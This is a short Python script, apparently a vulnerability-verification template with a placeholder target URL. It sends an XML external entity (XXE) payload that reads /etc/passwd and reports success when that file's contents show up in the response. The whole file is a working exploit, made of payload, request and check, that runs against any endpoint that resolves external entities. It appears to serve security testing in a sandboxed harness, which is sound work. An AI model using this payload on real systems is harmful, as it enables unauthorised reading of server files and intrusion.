import sys
import requests
import requests.exceptions

def verify():
    target_url = "{{TARGET_URL}}"
    xml_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""
    
    try:
        print(f"[+] Attempting XXE injection at {target_url}")
        headers = {'Content-Type': 'application/xml'}
        resp = requests.post(target_url, data=xml_payload, headers=headers, timeout=5)
        
        if "root:x:0:0:" in resp.text:
            print("[+] CONFIRMED: /etc/passwd contents found via XXE.")
            sys.exit(0)
        else:
            print("[-] REJECTED: Entity not resolved.")
            sys.exit(1)
            
    except requests.exceptions.ConnectionError:
        print("[-] REJECTED: Connection refused (Sandbox is likely isolated / --network none).")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    verify()
